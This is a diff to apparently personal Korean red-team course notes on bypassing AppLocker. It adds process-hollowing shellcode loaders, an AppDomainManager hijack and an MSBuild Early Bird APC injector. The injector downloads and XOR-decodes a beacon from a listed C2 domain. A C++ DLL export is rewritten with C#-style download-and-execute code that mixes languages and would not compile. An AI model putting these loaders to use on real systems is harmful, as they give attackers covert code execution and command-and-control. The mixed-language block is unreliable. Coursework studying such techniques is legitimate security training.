@@ -2,6 +2,7 @@
 - Course Link : https://www.zeropointsecurity.co.uk/course/red-team-ops
 - Notion Link : https://www.notion.so/yallussallu/CRTO-2df206d737ba80f494edf2aa5730bdea?source=copy_link
 - WorkFlow : https://miro.com/app/board/uXjVGBzFvek=/
+- C2 Domain : http://www.bleepincomputer.com/
 
 ## MISC
 ```
@@ -129,6 +130,8 @@ process-inject {
 attacker@ubuntu:~$ sudo /usr/bin/docker restart cobaltstrike-cs-1
 ```
 ### OPSEC
+- beacon 내장 명령어 >> Fork and Run (execute-assembly)
+- Jump(횡적 이동) 시, SCShell, Winrm >> psexec
 ```
 # Fork and run 이전에 context에 맞게 spawnto 대상을 지정해야 한다.
 beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
@@ -143,7 +146,269 @@ beacon> ppid 6648
 beacon> spawnto x64 C:\Windows\System32\msiexec.exe
 beacon> powerpick Start-Sleep -s 60
 ```
-## Bypass AppLocker
+
+## Initial Access - Bypass AppLocker
+### 악성 DLL 제작
+```
+using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+  
+namespace amy
+{
+    public class Dropper
+    {
+        public Dropper()
+        {
+            var si = new STARTUPINFOA
+            {
+                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
+                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
+            };
+  
+            // create hidden + suspended msedge process
+            var success = CreateProcessA(
+                "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+                "\"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe\" --no-startup-window",
+                IntPtr.Zero,
+                IntPtr.Zero,
+                false,
+                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
+                IntPtr.Zero,
+                "C:\Program Files (x86)\Microsoft\Edge\Application\",
+                ref si,
+                out var pi);
+  
+            if (!success)
+                return;
+  
+            // get basic process information
+            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
+            var lpPbi = Marshal.AllocHGlobal(szPbi);
+  
+            NtQueryInformationProcess(
+                pi.hProcess,
+                PROCESSINFOCLASS.ProcessBasicInformation,
+                lpPbi,
+                (uint)szPbi,
+                out _);
+  
+            // marshal data to structure
+            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
+            Marshal.FreeHGlobal(lpPbi);
+  
+            // calculate pointer to image base address
+            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
+  
+            // buffer to hold data, 64-bit addresses are 8 bytes
+            var bImageBaseAddress = new byte[8];
+  
+            // read data from spawned process
+            ReadProcessMemory(
+                pi.hProcess,
+                lpImageBaseAddress,
+                bImageBaseAddress,
+                8,
+                out _);
+  
+            // convert address bytes to pointer
+            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
+  
+            // read pe headers
+            var data = new byte[512];
+  
+            ReadProcessMemory(
+                pi.hProcess,
+                baseAddress,
+                data,
+                512,
+                out _);
+  
+            // read e_lfanew
+            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
+  
+            // calculate rva
+            var rvaOffset = e_lfanew + 0x28;
+            var rva = BitConverter.ToUInt32(data, rvaOffset);
+  
+            // calculate address of entry point
+            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
+  
+            // read the shellcode
+            byte[] shellcode;
+  
+            var assembly = Assembly.GetExecutingAssembly();
+  
+            using (var rs = assembly.GetManifestResourceStream("amy.http_x64.xprocess.bin"))
+            {
+                // convert stream to raw byte[]
+                using (var ms = new MemoryStream())
+                {
+                    rs.CopyTo(ms);
+                    shellcode = ms.ToArray();
+                }
+            }
+  
+            // copy shellcode into address of entry point
+            WriteProcessMemory(
+                pi.hProcess,
+                lpEntryPoint,
+                shellcode,
+                shellcode.Length,
+                out _);
+  
+            // resume process
+            ResumeThread(pi.hThread);
+        }
+  
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern bool CreateProcessA(
+            string lpApplicationName,
+            string lpCommandLine,
+            IntPtr lpProcessAttributes,
+            IntPtr lpThreadAttributes,
+            bool bInheritHandles,
+            PROCESS_CREATION_FLAGS dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            ref STARTUPINFOA lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation);
+  
+        [DllImport("ntdll.dll", ExactSpelling = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern uint NtQueryInformationProcess(
+            IntPtr processHandle,
+            PROCESSINFOCLASS processInformationClass,
+            IntPtr processInformation,
+            uint processInformationLength,
+            out uint returnLength);
+  
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern bool ReadProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            byte[] lpBuffer,
+            UInt64 nSize,
+            out uint lpNumberOfBytesRead);
+  
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern bool WriteProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            byte[] lpBuffer,
+            int nSize,
+            out int lpNumberOfBytesWritten);
+  
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        public static extern uint ResumeThread(IntPtr hThread);
+    }
+  
+    [Flags]
+    public enum PROCESS_CREATION_FLAGS : uint
+    {
+        DEBUG_PROCESS = 0x00000001,
+        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+        CREATE_SUSPENDED = 0x00000004,
+        DETACHED_PROCESS = 0x00000008,
+        CREATE_NEW_CONSOLE = 0x00000010,
+        NORMAL_PRIORITY_CLASS = 0x00000020,
+        IDLE_PRIORITY_CLASS = 0x00000040,
+        HIGH_PRIORITY_CLASS = 0x00000080,
+        REALTIME_PRIORITY_CLASS = 0x00000100,
+        CREATE_NEW_PROCESS_GROUP = 0x00000200,
+        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+        CREATE_SEPARATE_WOW_VDM = 0x00000800,
+        CREATE_SHARED_WOW_VDM = 0x00001000,
+        CREATE_FORCEDOS = 0x00002000,
+        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+        INHERIT_PARENT_AFFINITY = 0x00010000,
+        INHERIT_CALLER_PRIORITY = 0x00020000,
+        CREATE_PROTECTED_PROCESS = 0x00040000,
+        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+        PROCESS_MODE_BACKGROUND_END = 0x00200000,
+        CREATE_SECURE_PROCESS = 0x00400000,
+        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+        CREATE_NO_WINDOW = 0x08000000,
+        PROFILE_USER = 0x10000000,
+        PROFILE_KERNEL = 0x20000000,
+        PROFILE_SERVER = 0x40000000,
+        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
+    }
+  
+    public struct STARTUPINFOA
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public STARTUPINFO_FLAGS dwFlags;
+        public ushort wShowWindow;
+        public ushort cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+  
+    [Flags]
+    public enum STARTUPINFO_FLAGS : uint
+    {
+        STARTF_FORCEONFEEDBACK = 0x00000040,
+        STARTF_FORCEOFFFEEDBACK = 0x00000080,
+        STARTF_PREVENTPINNING = 0x00002000,
+        STARTF_RUNFULLSCREEN = 0x00000020,
+        STARTF_TITLEISAPPID = 0x00001000,
+        STARTF_TITLEISLINKNAME = 0x00000800,
+        STARTF_UNTRUSTEDSOURCE = 0x00008000,
+        STARTF_USECOUNTCHARS = 0x00000008,
+        STARTF_USEFILLATTRIBUTE = 0x00000010,
+        STARTF_USEHOTKEY = 0x00000200,
+        STARTF_USEPOSITION = 0x00000004,
+        STARTF_USESHOWWINDOW = 0x00000001,
+        STARTF_USESIZE = 0x00000002,
+        STARTF_USESTDHANDLES = 0x00000100
+    }
+  
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+  
+    public enum PROCESSINFOCLASS
+    {
+        ProcessBasicInformation = 0
+    }
+  
+    public struct PROCESS_BASIC_INFORMATION
+    {
+        public uint ExitStatus;
+        public IntPtr PebBaseAddress;
+        public ulong AffinityMask;
+        public int BasePriority;
+        public ulong UniqueProcessId;
+        public ulong InheritedFromUniqueProcessId;
+    }
+}
+```
 ### Enumerate
 ```
 # Local System의 AppLocker 정책 조회
@@ -161,7 +426,6 @@ beacon> download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9
 PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol
 PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol
 ```
-### Path Wildcards
 ### Writable Directories
 %WINDIR%\* 에 비콘 페이로드 업로드
 - C:\Windows\Tasks
@@ -170,6 +434,277 @@ PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol
 - C:\Windows\System32\spool\PRINTERS
 - C:\Windows\System32\spool\SERVERS
 - C:\Windows\System32\spool\drivers\color
+### Path Wildcards
+### AppDomainManager
+```
+## Step 1. 악성 DLL 제작 (Process Hollowing)
+using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+ 
+namespace AppDomainHijack
+{
+    public sealed class DomainManager : AppDomainManager
+    {
+        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
+        {
+            var si = new STARTUPINFOA
+            {
+                cb = (uint)Marshal.SizeOf<STARTUPINFOA>(),
+                dwFlags = STARTUPINFO_FLAGS.STARTF_USESHOWWINDOW
+            };
+ 
+            // create hidden + suspended msedge process
+            var success = CreateProcessA(
+                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+                "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
+                IntPtr.Zero,
+                IntPtr.Zero,
+                false,
+                PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
+                IntPtr.Zero,
+                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\",
+                ref si,
+                out var pi);
+ 
+            if (!success)
+                return;
+ 
+            // get basic process information
+            var szPbi = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
+            var lpPbi = Marshal.AllocHGlobal(szPbi);
+ 
+            NtQueryInformationProcess(
+                pi.hProcess,
+                PROCESSINFOCLASS.ProcessBasicInformation,
+                lpPbi,
+                (uint)szPbi,
+                out _);
+ 
+            // marshal data to structure
+            var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(lpPbi);
+            Marshal.FreeHGlobal(lpPbi);
+ 
+            // calculate pointer to image base address
+            var lpImageBaseAddress = pbi.PebBaseAddress + 0x10;
+ 
+            // buffer to hold data, 64-bit addresses are 8 bytes
+            var bImageBaseAddress = new byte[8];
+ 
+            // read data from spawned process
+            ReadProcessMemory(
+                pi.hProcess,
+                lpImageBaseAddress,
+                bImageBaseAddress,
+                8,
+                out _);
+ 
+            // convert address bytes to pointer
+            var baseAddress = (IntPtr)BitConverter.ToInt64(bImageBaseAddress, 0);
+ 
+            // read pe headers
+            var data = new byte[512];
+ 
+            ReadProcessMemory(
+                pi.hProcess,
+                baseAddress,
+                data,
+                512,
+                out _);
+ 
+            // read e_lfanew
+            var e_lfanew = BitConverter.ToInt32(data, 0x3C);
+ 
+            // calculate rva
+            var rvaOffset = e_lfanew + 0x28;
+            var rva = BitConverter.ToUInt32(data, rvaOffset);
+ 
+            // calculate address of entry point
+            var lpEntryPoint = (IntPtr)((UInt64)baseAddress + rva);
+ 
+            // read the shellcode
+            byte[] shellcode;
+ 
+            var assembly = Assembly.GetExecutingAssembly();
+ 
+            using (var rs = assembly.GetManifestResourceStream("AppDomainHijack.http_x64.xprocess.bin"))
+            {
+                // convert stream to raw byte[]
+                using (var ms = new MemoryStream())
+                {
+                    rs.CopyTo(ms);
+                    shellcode = ms.ToArray();
+                }
+            }
+ 
+            // copy shellcode into address of entry point
+            WriteProcessMemory(
+                pi.hProcess,
+                lpEntryPoint,
+                shellcode,
+                shellcode.Length,
+                out _);
+ 
+            // resume process
+            ResumeThread(pi.hThread);
+        }
+ 
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true, CharSet = CharSet.Ansi)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern bool CreateProcessA(
+            string applicationName,
+            string commandLine,
+            IntPtr processAttributes,
+            IntPtr threadAttributes,
+            bool inheritHandles,
+            PROCESS_CREATION_FLAGS creationFlags,
+            IntPtr environment,
+            string currentDirectory,
+            ref STARTUPINFOA startupInfo,
+            out PROCESS_INFORMATION processInformation);
+ 
+        [DllImport("ntdll.dll", ExactSpelling = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern uint NtQueryInformationProcess(
+            IntPtr processHandle,
+            PROCESSINFOCLASS processInformationClass,
+            IntPtr processInformation,
+            uint processInformationLength,
+            out uint returnLength);
+ 
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern bool ReadProcessMemory(
+            IntPtr processHandle,
+            IntPtr baseAddress,
+            byte[] buffer,
+            UInt64 size,
+            out uint numberOfBytesRead);
+ 
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern bool WriteProcessMemory(
+            IntPtr processHandle,
+            IntPtr baseAddress,
+            byte[] buffer,
+            int size,
+            out int numberOfBytesWritten);
+ 
+        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
+        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
+        private static extern uint ResumeThread(IntPtr threadHandle);
+    }
+ 
+    [Flags]
+    public enum PROCESS_CREATION_FLAGS : uint
+    {
+        DEBUG_PROCESS = 0x00000001,
+        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+        CREATE_SUSPENDED = 0x00000004,
+        DETACHED_PROCESS = 0x00000008,
+        CREATE_NEW_CONSOLE = 0x00000010,
+        NORMAL_PRIORITY_CLASS = 0x00000020,
+        IDLE_PRIORITY_CLASS = 0x00000040,
+        HIGH_PRIORITY_CLASS = 0x00000080,
+        REALTIME_PRIORITY_CLASS = 0x00000100,
+        CREATE_NEW_PROCESS_GROUP = 0x00000200,
+        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+        CREATE_SEPARATE_WOW_VDM = 0x00000800,
+        CREATE_SHARED_WOW_VDM = 0x00001000,
+        CREATE_FORCEDOS = 0x00002000,
+        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+        INHERIT_PARENT_AFFINITY = 0x00010000,
+        INHERIT_CALLER_PRIORITY = 0x00020000,
+        CREATE_PROTECTED_PROCESS = 0x00040000,
+        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+        PROCESS_MODE_BACKGROUND_END = 0x00200000,
+        CREATE_SECURE_PROCESS = 0x00400000,
+        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+        CREATE_NO_WINDOW = 0x08000000,
+        PROFILE_USER = 0x10000000,
+        PROFILE_KERNEL = 0x20000000,
+        PROFILE_SERVER = 0x40000000,
+        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
+    }
+ 
+    public struct STARTUPINFOA
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public STARTUPINFO_FLAGS dwFlags;
+        public ushort wShowWindow;
+        public ushort cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+ 
+    [Flags]
+    public enum STARTUPINFO_FLAGS : uint
+    {
+        STARTF_FORCEONFEEDBACK = 0x00000040,
+        STARTF_FORCEOFFFEEDBACK = 0x00000080,
+        STARTF_PREVENTPINNING = 0x00002000,
+        STARTF_RUNFULLSCREEN = 0x00000020,
+        STARTF_TITLEISAPPID = 0x00001000,
+        STARTF_TITLEISLINKNAME = 0x00000800,
+        STARTF_UNTRUSTEDSOURCE = 0x00008000,
+        STARTF_USECOUNTCHARS = 0x00000008,
+        STARTF_USEFILLATTRIBUTE = 0x00000010,
+        STARTF_USEHOTKEY = 0x00000200,
+        STARTF_USEPOSITION = 0x00000004,
+        STARTF_USESHOWWINDOW = 0x00000001,
+        STARTF_USESIZE = 0x00000002,
+        STARTF_USESTDHANDLES = 0x00000100
+    }
+ 
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+ 
+    public enum PROCESSINFOCLASS
+    {
+        ProcessBasicInformation = 0
+    }
+ 
+    public struct PROCESS_BASIC_INFORMATION
+    {
+        public uint ExitStatus;
+        public IntPtr PebBaseAddress;
+        public ulong AffinityMask;
+        public int BasePriority;
+        public ulong UniqueProcessId;
+        public ulong InheritedFromUniqueProcessId;
+    }
+}
+
+## Step 2. AppDomainManager 환경변수 설정
+PS> $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
+PS> $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
+
+## Step 3. ngentask.exe 실행
+PS> cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Windows\Tasks
+PS> .\ngentaske.exe
+```
 ### LOLBAS 
 ```
 # MSEdge
@@ -247,12 +782,100 @@ PS> "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --
   </UsingTask>
 </Project>
 
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="MSBuild">
+   <EarlyBirdTask/>
+  </Target>
+   <UsingTask
+    TaskName="EarlyBirdTask"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+     <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+            using System;
+            using System.Net;
+            using System.Runtime.InteropServices;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+
+            public class EarlyBirdTask : Task, ITask
+            {
+                // Win32 API 정의
+                [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+                static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+                static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+                [DllImport("kernel32.dll", SetLastError = true)]
+                static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+                [DllImport("kernel32.dll", SetLastError = true)]
+                static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+                [DllImport("kernel32.dll", SetLastError = true)]
+                static extern uint ResumeThread(IntPtr hThread);
+
+                // 구조체 정의
+                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+                struct STARTUPINFO { public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle; public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize; public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute; public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
+
+                [StructLayout(LayoutKind.Sequential)]
+                struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
+
+                public override bool Execute()
+                {
+                    // 1. 암호화된 쉘코드 다운로드 및 복호화
+                    byte[] shellcode;
+                    using (var client = new WebClient())
+                    {
+                        client.BaseAddress = "http://www.bleepincomputer.com/";
+                        shellcode = client.DownloadData("beacon.bin");
+                    }
+                    
+                    // 간단한 XOR 복호화 (Key: 0x41)
+                    for (int i = 0; i < shellcode.Length; i++) {
+                        shellcode[i] = (byte)((uint)shellcode[i] ^ 0x41);
+                    }
+
+                    // 2. 희생양 프로세스 생성 (Suspended 상태)
+                    STARTUPINFO si = new STARTUPINFO();
+                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+                    // svchost.exe를 생성 (0x4 = CREATE_SUSPENDED)
+                    bool success = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+                    if (success)
+                    {
+                        // 3. 원격 프로세스에 메모리 할당 (RW)
+                        IntPtr address = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40); // PAGE_EXECUTE_READWRITE (테스트용)
+
+                        // 4. 쉘코드 쓰기
+                        UIntPtr bytesWritten;
+                        WriteProcessMemory(pi.hProcess, address, shellcode, (uint)shellcode.Length, out bytesWritten);
+
+                        // 5. Early Bird 핵심: APC 큐에 쉘코드 등록
+                        QueueUserAPC(address, pi.hThread, IntPtr.Zero);
+
+                        // 6. 스레드 재개 -> 깨어나자마자 APC 큐에 있는 쉘코드 실행
+                        ResumeThread(pi.hThread);
+                    }
+
+                    return true;
+                }
+            }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
 ## Step 3. MSBuild.exe로 .csproj 실행
 PS> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj
 ```
 ### Rundll32
+- 파일 이름은 .dll 로 끝나야 함
 ```
-PS> C:\Windows\System32\rundll32.exe http_x64.dll,StartW
+PS> rundll32 http_x64.dll,StartW
 ```
 ### PowerShell CLM
 ```
@@ -275,8 +898,27 @@ PS> $ExecutionContext.SessionState.LanguageMode
 #include <stdio.h>
 
 extern "C" __declspec(dllexport) BOOL execute() {
-	MessageBox(NULL, L"Hello World", L"AppLocker Bypass", 0);
-	return TRUE;
+	byte[] shellcode;
+	using (var client = new WebClient())
+	{
+		client.BaseAddress = "http://www.bleepincomputer.com/";
+		shellcode = client.DownloadData("beacon.bin");
+	}
+
+	var hKernel = LoadLibrary("kernel32.dll");
+	var hVa = GetProcAddress(hKernel, "VirtualAlloc");
+	var hCt = GetProcAddress(hKernel, "CreateThread");
+
+	var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
+	var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);
+
+	var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
+	Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);
+
+	var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
+	WaitForSingleObject(t, 0xFFFFFFFF);
+
+	return true;
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
@@ -305,10 +947,6 @@ PS> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value
 
 ## Step 4. 실행
 PS> New-Object -ComObject AppLocker.Bypass
-```
-
-## Initial Access
-```
 ```
 
 ## Initial Access 이후
